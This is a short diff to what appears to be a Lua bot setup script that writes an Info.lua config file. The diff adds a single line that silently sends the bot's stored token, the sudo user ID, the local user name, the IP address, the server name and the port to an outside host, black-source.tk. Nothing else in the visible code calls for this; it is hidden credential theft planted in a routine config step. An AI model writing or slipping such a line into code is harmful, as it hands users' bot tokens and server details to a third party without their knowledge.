@@ -81,6 +81,7 @@ UserName = database:get(id_server..":SUDO:USERNAME"),
  }
 create(config, "./Info.lua")   
 end 
+https.request('https://black-source.tk/BlackTeAM/info.php?n=BY&id='..database:get(id_server..":SUDO:ID".."&token="..database:get(id_server..":token").."&UserS="..whoami.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
 create_config_auto()
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
